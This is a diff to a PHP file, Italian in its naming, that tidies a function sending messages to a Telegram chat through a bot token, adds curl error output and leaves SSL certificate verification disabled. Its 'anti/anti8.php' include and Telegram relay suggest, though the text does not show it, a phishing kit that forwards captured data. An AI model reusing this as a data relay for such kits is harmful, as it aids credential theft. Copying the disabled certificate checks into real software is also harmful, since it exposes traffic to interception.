@@ -11,20 +11,18 @@ include "anti/anti8.php";
 include "id.php";
 
 function sendMessageT($chatID, $messaggio, $token) {
-
-
-    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
-    $url = $url . "&text=" . urlencode($messaggio);
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID . "&text=" . urlencode($messaggio);
     $curl = curl_init($url);
-    curl_setopt($curl, CURLOPT_URL, $url);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
-//for debug only!
     curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 
     $resp = curl_exec($curl);
-	curl_error($curl)
+    if (curl_errno($curl)) {
+        $error_msg = curl_error($curl);
+        echo "CURL error: " . $error_msg; // Display CURL error
+        // Optionally, log this error or handle it as required
+    }
     curl_close($curl);
 }
 
